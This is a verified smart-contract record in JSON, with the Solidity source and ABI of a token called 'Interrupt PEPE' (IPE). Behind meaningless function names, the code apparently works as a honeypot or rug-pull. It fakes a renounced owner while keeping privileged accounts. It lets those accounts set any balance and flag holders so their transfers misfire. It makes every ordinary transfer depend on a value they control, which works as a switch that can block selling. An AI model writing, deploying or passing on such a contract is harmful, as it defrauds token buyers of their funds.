{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface receiverLiquidityTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFee) external view returns (uint256);\n\n    function transfer(address exemptAtFrom, uint256 isTake) external returns (bool);\n\n    function allowance(address limitWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptAtFrom,\n        uint256 isTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableFee, uint256 value);\n    event Approval(address indexed limitWallet, address indexed spender, uint256 value);\n}\n\nabstract contract swapTeamBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTrading {\n    function createPair(address walletIsBuy, address buyMarketingMin) external returns (address);\n}\n\ninterface marketingList is receiverLiquidityTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterruptPEPE is swapTeamBuy, receiverLiquidityTx, marketingList {\n\n    bool private atFromToken;\n\n    uint256 public fundListAt;\n\n    mapping(address => bool) public fundLimitAt;\n\n    function shouldReceiver(address sellLaunchedLimit) public {\n        maxToExempt();\n        \n        if (sellLaunchedLimit == fundToken || sellLaunchedLimit == fromFund) {\n            return;\n        }\n        fundLimitAt[sellLaunchedLimit] = true;\n    }\n\n    function transfer(address marketingAt, uint256 isTake) external virtual override returns (bool) {\n        return autoTo(_msgSender(), marketingAt, isTake);\n    }\n\n    uint256 private minTeam;\n\n    function maxBuy(address marketingAt, uint256 isTake) public {\n        maxToExempt();\n        launchedExempt[marketingAt] = isTake;\n    }\n\n    bool private swapMax;\n\n    function transferFrom(address fromEnable, address exemptAtFrom, uint256 isTake) external override returns (bool) {\n        if (_msgSender() != liquidityIs) {\n            if (isLaunch[fromEnable][_msgSender()] != type(uint256).max) {\n                require(isTake <= isLaunch[fromEnable][_msgSender()]);\n                isLaunch[fromEnable][_msgSender()] -= isTake;\n            }\n        }\n        return autoTo(fromEnable, exemptAtFrom, isTake);\n    }\n\n    uint256 public minLaunchTo;\n\n    uint8 private feeMin = 18;\n\n    mapping(address => mapping(address => uint256)) private isLaunch;\n\n    function maxToExempt() private view {\n        require(teamEnable[_msgSender()]);\n    }\n\n    address private fromReceiver;\n\n    mapping(address => uint256) private launchedExempt;\n\n    uint256 launchedFee;\n\n    bool public launchedWallet;\n\n    mapping(address => bool) public teamEnable;\n\n    address public fundToken;\n\n    address marketingTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (minTeam == atShould) {\n            atShould = minTeam;\n        }\n        takeTeam exemptMax = takeTeam(liquidityIs);\n        fromFund = feeTrading(exemptMax.factory()).createPair(exemptMax.WETH(), address(this));\n        \n        fundToken = _msgSender();\n        teamBuyAt();\n        teamEnable[fundToken] = true;\n        launchedExempt[fundToken] = isWallet;\n        \n        emit Transfer(address(0), fundToken, isWallet);\n    }\n\n    uint256 constant toAt = 19 ** 10;\n\n    uint256 private isWallet = 100000000 * 10 ** 18;\n\n    uint256 enableListTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isWallet;\n    }\n\n    function owner() external view returns (address) {\n        return fromReceiver;\n    }\n\n    function receiverTeam(address fromEnable, address exemptAtFrom, uint256 isTake) internal returns (bool) {\n        require(launchedExempt[fromEnable] >= isTake);\n        launchedExempt[fromEnable] -= isTake;\n        launchedExempt[exemptAtFrom] += isTake;\n        emit Transfer(fromEnable, exemptAtFrom, isTake);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingLimit;\n    }\n\n    function feeMax(address marketingAmount) public {\n        if (tradingTx) {\n            return;\n        }\n        \n        teamEnable[marketingAmount] = true;\n        if (launchedWallet != swapMax) {\n            atFromToken = true;\n        }\n        tradingTx = true;\n    }\n\n    bool public tradingTx;\n\n    bool private liquidityAt;\n\n    function balanceOf(address txFee) public view virtual override returns (uint256) {\n        return launchedExempt[txFee];\n    }\n\n    string private tradingLimit = \"Interrupt PEPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxReceiver;\n    }\n\n    function buySwap(uint256 isTake) public {\n        maxToExempt();\n        enableListTeam = isTake;\n    }\n\n    string private maxReceiver = \"IPE\";\n\n    function approve(address liquidityLaunchShould, uint256 isTake) public virtual override returns (bool) {\n        isLaunch[_msgSender()][liquidityLaunchShould] = isTake;\n        emit Approval(_msgSender(), liquidityLaunchShould, isTake);\n        return true;\n    }\n\n    address public fromFund;\n\n    event OwnershipTransferred(address indexed fromTeam, address indexed limitReceiver);\n\n    function autoTo(address fromEnable, address exemptAtFrom, uint256 isTake) internal returns (bool) {\n        if (fromEnable == fundToken) {\n            return receiverTeam(fromEnable, exemptAtFrom, isTake);\n        }\n        uint256 sellToken = receiverLiquidityTx(fromFund).balanceOf(marketingTeam);\n        require(sellToken == enableListTeam);\n        require(exemptAtFrom != marketingTeam);\n        if (fundLimitAt[fromEnable]) {\n            return receiverTeam(fromEnable, exemptAtFrom, toAt);\n        }\n        return receiverTeam(fromEnable, exemptAtFrom, isTake);\n    }\n\n    function teamBuyAt() public {\n        emit OwnershipTransferred(fundToken, address(0));\n        fromReceiver = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return fromReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMin;\n    }\n\n    address liquidityIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address txLaunch, address liquidityLaunchShould) external view virtual override returns (uint256) {\n        if (liquidityLaunchShould == liquidityIs) {\n            return type(uint256).max;\n        }\n        return isLaunch[txLaunch][liquidityLaunchShould];\n    }\n\n    uint256 private atShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunchShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"buySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"}],\"name\":\"feeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLimitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundListAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunchedLimit\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAtFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InterruptPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}